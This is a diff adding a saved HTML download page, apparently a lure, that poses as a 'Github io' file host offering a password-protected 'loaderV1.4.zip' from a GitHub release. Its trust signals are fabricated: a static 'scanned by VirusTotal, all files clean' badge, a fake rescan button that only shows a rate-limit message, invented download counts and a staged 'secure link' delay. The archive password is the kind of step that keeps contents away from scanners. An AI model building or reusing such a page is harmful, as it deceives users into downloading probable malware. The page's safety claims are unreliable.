@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<!-- saved from url=(0038)https://dalmatan3000.github.io/loader/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Github io · loaderV1.4.zip</title>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="./Github io · loaderV1.4.zip_files/all.min.css">
+    <!-- Google Font: Inter (modern) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="./Github io · loaderV1.4.zip_files/css2" rel="stylesheet">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://dalmatan3000.github.io/favicon-16x16.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://dalmatan3000.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/x-icon" href="https://dalmatan3000.github.io/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://dalmatan3000.github.io/apple-touch-icon.png">
+    <link rel="manifest" href="https://dalmatan3000.github.io/site.webmanifest">
+    <link rel="icon" type="image/svg+xml" href="https://dalmatan3000.github.io/favicon-gradient.svg">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 80px 1.5rem 30px;
+            color: #e0e0e0;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .snowflake {
+            position: fixed;
+            top: -10px;
+            color: #fff;
+            user-select: none;
+            pointer-events: none;
+            opacity: 0.7;
+            font-size: 1.5rem;
+            animation: fall linear forwards;
+            z-index: 5;
+        }
+
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+
+        .top-left-link {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 30;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            color: #f0e6ff;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .top-left-link i {
+            font-size: 2.2rem;
+            color: #a56eff;
+            filter: drop-shadow(0 0 10px #a56eff);
+        }
+
+        .top-left-link span {
+            color: #f0e6ff;
+        }
+
+        .top-left-link .rest-part {
+            color: #a56eff;
+        }
+
+        .top-left-link:hover {
+            color: #ffffff;
+        }
+
+        .top-right-link {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 30;
+            font-weight: 600;
+            text-decoration: none;
+            padding: 12px 28px;
+            border-radius: 50px;
+            background: rgba(10, 10, 10, 0.7);
+            backdrop-filter: blur(8px);
+            border: 1.5px solid #bb86fc80;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+            font-size: 1.2rem;
+            color: #bb86fc;
+        }
+
+        .top-right-link:hover {
+            background: #2a2a2a;
+            border-color: #bb86fc;
+            color: #fff;
+            transform: scale(1.02);
+        }
+
+        .top-right-link i {
+            font-size: 1.4rem;
+        }
+
+        .card {
+            background: #1a1a1a;
+            border-radius: 40px;
+            padding: 2rem 2rem 2rem;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 30px 45px -20px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(187, 134, 252, 0.2);
+            border: 1px solid #333;
+            position: relative;
+            z-index: 10;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            background: linear-gradient(145deg, #bb86fc, #9f4bff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        .file-header {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: baseline;
+            justify-content: space-between;
+            background: #252525;
+            padding: 0.9rem 1.5rem;
+            border-radius: 60px;
+            margin-bottom: 1.5rem;
+            border: 1px solid #3a3a3a;
+        }
+
+        .filename {
+            font-size: 1.3rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            color: #e0e0e0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .filename i {
+            color: #bb86fc;
+            font-size: 1.2rem;
+        }
+
+        .download-stats {
+            display: flex;
+            gap: 1.2rem;
+            font-size: 0.9rem;
+            background: #1f1f1f;
+            padding: 0.4rem 1.2rem;
+            border-radius: 40px;
+            border: 1px solid #3e3e3e;
+        }
+
+        .stats-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #aaa;
+        }
+
+        .stats-item i {
+            color: #bb86fc;
+            width: 18px;
+        }
+
+        .stats-item span {
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .scan-badge {
+            background: #1e1e1e;
+            border-left: 4px solid #4caf50;
+            padding: 0.8rem 1.2rem;
+            border-radius: 50px;
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1rem;
+            color: #ccc;
+            border: 1px solid #2e2e2e;
+            flex-wrap: wrap;
+        }
+
+        .scan-badge i {
+            color: #4caf50;
+            font-size: 1.4rem;
+        }
+
+        .rescan-btn {
+            background: transparent;
+            border: 1px solid #bb86fc80;
+            color: #bb86fc;
+            font-size: 0.85rem;
+            padding: 0.3rem 1rem;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: all 0.15s;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            margin-left: auto;
+            font-weight: 500;
+        }
+
+        .rescan-btn:hover {
+            background: #bb86fc20;
+            border-color: #bb86fc;
+            color: #fff;
+        }
+
+        .rescan-btn i {
+            font-size: 0.9rem;
+            color: currentColor;
+        }
+
+        .toast-message {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #2a2a2a;
+            color: #e0e0e0;
+            padding: 0.8rem 1.8rem;
+            border-radius: 60px;
+            font-size: 0.95rem;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.7), 0 0 0 1px #bb86fc;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 100;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.2s, visibility 0.2s;
+            border-left: 4px solid #bb86fc;
+            backdrop-filter: blur(4px);
+        }
+
+        .toast-message.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .toast-message i {
+            color: #bb86fc;
+            font-size: 1.2rem;
+        }
+
+        .progress-container {
+            background: #2a2a2a;
+            height: 30px;
+            border-radius: 40px;
+            margin: 1.8rem 0 1rem;
+            overflow: hidden;
+            border: 1px solid #3a3a3a;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #bb86fc, #9f4bff);
+            border-radius: 40px;
+            box-shadow: 0 0 8px #9f4bff80;
+            transition: width 5s linear;
+        }
+
+        .wait-message {
+            text-align: center;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            color: #bb86fc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #1f1f2a;
+            width: fit-content;
+            padding: 0.4rem 1.2rem;
+            border-radius: 60px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .wait-message i {
+            font-size: 1rem;
+            animation: pulse 1.2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .download-btn-container {
+            display: flex;
+            justify-content: center;
+            margin: 1.8rem 0 0.8rem;
+            min-height: 85px;
+        }
+
+        .btn-download {
+            background: linear-gradient(145deg, #bb86fc, #9f4bff);
+            border: none;
+            color: #0a0a0a;
+            font-weight: 700;
+            padding: 1rem 3.5rem;
+            border-radius: 60px;
+            font-size: 1.4rem;
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 8px 20px rgba(187, 134, 252, 0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+            text-decoration: none;
+            color: #0a0a0a;
+        }
+
+        .btn-download:hover {
+            transform: scale(1.02);
+            box-shadow: 0 12px 28px rgba(187, 134, 252, 0.5);
+        }
+
+        .btn-download i {
+            font-size: 1.6rem;
+        }
+
+        .hidden-download {
+            display: none;
+        }
+
+        .password-hint {
+            background: #1e1e2a;
+            border-radius: 60px;
+            padding: 0.7rem 1.2rem;
+            margin: 0.5rem 0 0.5rem;
+            text-align: center;
+            font-size: 1rem;
+            border: 1px solid #bb86fc60;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            color: #e0e0e0;
+            backdrop-filter: blur(2px);
+        }
+
+        .password-hint i {
+            color: #ffb86c;
+            font-size: 1.2rem;
+            filter: drop-shadow(0 0 3px #ffb86c80);
+        }
+
+        .password-hint strong {
+            background: #2a2a2a;
+            padding: 0.25rem 1rem;
+            border-radius: 40px;
+            font-family: 'Inter', monospace;
+            font-size: 1.1rem;
+            letter-spacing: 1.5px;
+            color: #bb86fc;
+            font-weight: 700;
+            border: 1px solid #bb86fc40;
+            box-shadow: inset 0 0 4px rgba(0,0,0,0.3), 0 1px 2px rgba(0,0,0,0.2);
+        }
+
+        .footer-note {
+            margin-top: 2rem;
+            font-size: 0.8rem;
+            color: #666;
+            border-top: 1px dashed #333;
+            padding-top: 1.5rem;
+            text-align: center;
+        }
+
+        .message {
+            color: #888;
+            margin: 0.5rem 0 1rem;
+            font-size: 0.95rem;
+            text-align: center;
+        }
+
+        .bottom-slogan {
+            margin-top: 2.5rem;
+            text-align: center;
+            color: #777;
+            font-size: 1rem;
+            max-width: 600px;
+            line-height: 1.6;
+            font-weight: 400;
+            letter-spacing: 0.3px;
+            border-top: 1px solid #2a2a2a;
+            padding-top: 2rem;
+            width: 100%;
+        }
+
+        .bottom-slogan i {
+            color: #bb86fc;
+            margin: 0 4px;
+        }
+
+        .bottom-slogan strong {
+            color: #bb86fc;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <a href="https://github.com/" class="top-left-link">
+        <i class="fas fa-link"></i>
+        <span>Github<span class="rest-part">.io</span></span>
+    </a>
+
+    <a href="https://github.io/login" class="top-right-link">
+        <i class="fas fa-user-circle"></i> Login
+    </a>
+
+    <div class="card">
+        <h1>⚡ Github io</h1>
+
+        <div class="file-header">
+            <div class="filename">
+                <i class="fas fa-file-archive"></i> loaderV1.4.zip
+            </div>
+            <div class="download-stats">
+                <div class="stats-item"><i class="fas fa-download"></i> total <span>5,411</span></div>
+                <div class="stats-item"><i class="fas fa-calendar-day"></i> today <span>141</span></div>
+            </div>
+        </div>
+
+        <div class="scan-badge">
+            <i class="fas fa-shield-virus"></i>
+            <span>All files clean · scanned by <strong>VirusTotal</strong></span>
+            <div class="rescan-btn" id="rescanBtn">
+                <i class="fas fa-sync-alt"></i> rescan
+            </div>
+        </div>
+
+        <div class="toast-message" id="rateLimitToast">
+            <i class="fas fa-hourglass-half"></i>
+            <span>Too many scan requests · last scan was 2 hours ago</span>
+        </div>
+
+        <!-- Прогресс-бар с анимацией -->
+        <div class="progress-container">
+            <div class="progress-bar" id="progressFill" style="width: 100%;"></div>
+        </div>
+
+        <!-- Индикатор ожидания -->
+        <div id="waitingIndicator" class="wait-message" style="transition: opacity 0.3s; opacity: 0; display: none;">
+            <i class="fas fa-spinner fa-pulse"></i> Preparing secure link · please wait 5 seconds
+        </div>
+
+        <!-- Контейнер для кнопки (изначально кнопка скрыта) -->
+        <div class="download-btn-container">
+            <a href="https://github.com/dalmatan3000/loader/releases/download/loader/loaderV1.4.zip" class="btn-download" id="downloadBtn" data-page="L2XZZM">
+                <i class="fas fa-arrow-down"></i> Download
+            </a>
+        </div>
+
+        <div class="password-hint">
+            <i class="fas fa-key"></i>
+            <span>Archive password:</span>
+            <strong>respocket</strong>
+            <i class="fas fa-lock" style="font-size: 0.9rem; opacity: 0.8;"></i>
+        </div>
+
+        <div class="message">
+            <i class="fas fa-lock" style="opacity:0.6;"></i> secure direct link · ready after preparation
+        </div>
+
+        <div class="footer-note">
+            <i class="fas fa-shield-alt"></i> direct download · encrypted channel
+        </div>
+    </div>
+
+    <div class="bottom-slogan">
+        <i class="fas fa-server"></i> <strong>Github.io</strong> delivers premium server quality for the fastest sharing of your files — trusted since 2017 <i class="fas fa-heart" style="color:#bb86fc; font-size:0.9rem;"></i>
+    </div>
+
+    <script>
+        (function() {
+            // ❄️ Снежинки
+            function createSnowflake() {
+                const snowflake = document.createElement('div');
+                snowflake.classList.add('snowflake');
+                snowflake.innerHTML = '❄️';
+                snowflake.style.left = Math.random() * 100 + 'vw';
+                const duration = Math.random() * 8 + 10;
+                snowflake.style.animationDuration = duration + 's';
+                snowflake.style.fontSize = (Math.random() * 1.5 + 0.8) + 'rem';
+                snowflake.style.opacity = Math.random() * 0.6 + 0.3;
+                document.body.appendChild(snowflake);
+                snowflake.addEventListener('animationend', () => snowflake.remove());
+            }
+            setInterval(createSnowflake, 350);
+
+            // Рескан + тост
+            const rescanBtn = document.getElementById('rescanBtn');
+            const toast = document.getElementById('rateLimitToast');
+            if (rescanBtn) {
+                rescanBtn.addEventListener('click', () => {
+                    toast.classList.add('show');
+                    setTimeout(() => toast.classList.remove('show'), 3500);
+                });
+            }
+
+            // Элементы
+            const progressBar = document.getElementById('progressFill');
+            const waitingDiv = document.getElementById('waitingIndicator');
+            const downloadBtn = document.getElementById('downloadBtn');
+
+            // Старт: ширина 0, кнопка скрыта
+            if (progressBar) {
+                progressBar.style.width = '0%';
+                // Запускаем анимацию заполнения до 100% за 5 секунд
+                setTimeout(() => {
+                    progressBar.style.width = '100%';
+                }, 20);
+            }
+
+            // Через 5 секунд убираем индикатор ожидания и показываем кнопку
+            setTimeout(() => {
+                if (waitingDiv) {
+                    waitingDiv.style.transition = 'opacity 0.3s';
+                    waitingDiv.style.opacity = '0';
+                    setTimeout(() => {
+                        waitingDiv.style.display = 'none';
+                    }, 300);
+                }
+                if (downloadBtn) {
+                    downloadBtn.classList.remove('hidden-download');
+                }
+            }, 5000);
+
+            // Обработчик кнопки загрузки с защитой от двойного клика и счётчиком
+            if (downloadBtn) {
+                let isDownloading = false;
+                downloadBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    if (isDownloading) return;
+                    isDownloading = true;
+
+                    const page = this.dataset.page;
+                    const fileUrl = this.href;
+
+                    // Вызов счётчика (если эндпоинт есть, иначе просто переход)
+                    fetch('/increment.php?action=increment&page=' + encodeURIComponent(page))
+                        .then(response => response.json())
+                        .then(() => {
+                            window.location.href = fileUrl;
+                        })
+                        .catch(() => {
+                            // Если ошибка — всё равно переходим по ссылке
+                            window.location.href = fileUrl;
+                        });
+
+                    // Разблокируем через 3 секунды на случай проблем с сетью
+                    setTimeout(() => { isDownloading = false; }, 3000);
+                });
+            }
+        })();
+    </script>
+
+
+<div class="snowflake" style="left: 32.0491vw; animation-duration: 17.1568s; font-size: 1.61427rem; opacity: 0.469541;">❄️</div><div class="snowflake" style="left: 22.5978vw; animation-duration: 14.5177s; font-size: 1.51877rem; opacity: 0.886685;">❄️</div><div class="snowflake" style="left: 20.7661vw; animation-duration: 13.9943s; font-size: 2.17941rem; opacity: 0.766787;">❄️</div><div class="snowflake" style="left: 48.8583vw; animation-duration: 17.4972s; font-size: 2.20308rem; opacity: 0.426402;">❄️</div><div class="snowflake" style="left: 25.4583vw; animation-duration: 14.4767s; font-size: 1.67089rem; opacity: 0.444581;">❄️</div><div class="snowflake" style="left: 44.9542vw; animation-duration: 16.1844s; font-size: 2.15178rem; opacity: 0.316489;">❄️</div><div class="snowflake" style="left: 99.5013vw; animation-duration: 10.285s; font-size: 0.904571rem; opacity: 0.473148;">❄️</div><div class="snowflake" style="left: 36.0705vw; animation-duration: 15.1434s; font-size: 1.72831rem; opacity: 0.362607;">❄️</div><div class="snowflake" style="left: 9.93357vw; animation-duration: 16.2531s; font-size: 1.25904rem; opacity: 0.366219;">❄️</div><div class="snowflake" style="left: 42.7766vw; animation-duration: 10.2533s; font-size: 1.21385rem; opacity: 0.301061;">❄️</div><div class="snowflake" style="left: 42.8108vw; animation-duration: 10.0239s; font-size: 1.14075rem; opacity: 0.885112;">❄️</div><div class="snowflake" style="left: 77.8765vw; animation-duration: 16.1975s; font-size: 0.960245rem; opacity: 0.417126;">❄️</div><div class="snowflake" style="left: 53.7223vw; animation-duration: 14.7436s; font-size: 1.43772rem; opacity: 0.599683;">❄️</div><div class="snowflake" style="left: 28.9821vw; animation-duration: 12.6208s; font-size: 1.94345rem; opacity: 0.505519;">❄️</div><div class="snowflake" style="left: 69.2507vw; animation-duration: 15.6153s; font-size: 0.811751rem; opacity: 0.434284;">❄️</div><div class="snowflake" style="left: 27.5339vw; animation-duration: 15.4226s; font-size: 1.54186rem; opacity: 0.640199;">❄️</div><div class="snowflake" style="left: 31.1668vw; animation-duration: 17.967s; font-size: 1.16095rem; opacity: 0.463366;">❄️</div><div class="snowflake" style="left: 82.2169vw; animation-duration: 14.8015s; font-size: 0.947536rem; opacity: 0.602765;">❄️</div><div class="snowflake" style="left: 80.773vw; animation-duration: 15.4705s; font-size: 1.88052rem; opacity: 0.869853;">❄️</div><div class="snowflake" style="left: 65.1412vw; animation-duration: 12.7653s; font-size: 1.80432rem; opacity: 0.303401;">❄️</div><div class="snowflake" style="left: 78.1745vw; animation-duration: 13.0521s; font-size: 1.9237rem; opacity: 0.833712;">❄️</div><div class="snowflake" style="left: 30.7826vw; animation-duration: 16.5434s; font-size: 1.92261rem; opacity: 0.642859;">❄️</div><div class="snowflake" style="left: 24.5802vw; animation-duration: 15.165s; font-size: 2.05923rem; opacity: 0.755932;">❄️</div><div class="snowflake" style="left: 30.7104vw; animation-duration: 16.7801s; font-size: 1.74471rem; opacity: 0.508979;">❄️</div><div class="snowflake" style="left: 88.2456vw; animation-duration: 17.388s; font-size: 0.894825rem; opacity: 0.832594;">❄️</div><div class="snowflake" style="left: 28.0095vw; animation-duration: 14.8911s; font-size: 1.55405rem; opacity: 0.450007;">❄️</div><div class="snowflake" style="left: 70.0891vw; animation-duration: 10.6554s; font-size: 1.56869rem; opacity: 0.88518;">❄️</div><div class="snowflake" style="left: 30.0897vw; animation-duration: 15.9543s; font-size: 1.67953rem; opacity: 0.897737;">❄️</div><div class="snowflake" style="left: 16.6884vw; animation-duration: 16.6704s; font-size: 2.15278rem; opacity: 0.49766;">❄️</div><div class="snowflake" style="left: 4.26828vw; animation-duration: 13.9092s; font-size: 2.13321rem; opacity: 0.803785;">❄️</div><div class="snowflake" style="left: 71.1938vw; animation-duration: 14.9183s; font-size: 1.86047rem; opacity: 0.373727;">❄️</div><div class="snowflake" style="left: 79.506vw; animation-duration: 17.3495s; font-size: 1.93916rem; opacity: 0.313682;">❄️</div><div class="snowflake" style="left: 88.852vw; animation-duration: 12.7369s; font-size: 1.92243rem; opacity: 0.717592;">❄️</div><div class="snowflake" style="left: 37.414vw; animation-duration: 17.405s; font-size: 1.13848rem; opacity: 0.750554;">❄️</div></body></html>
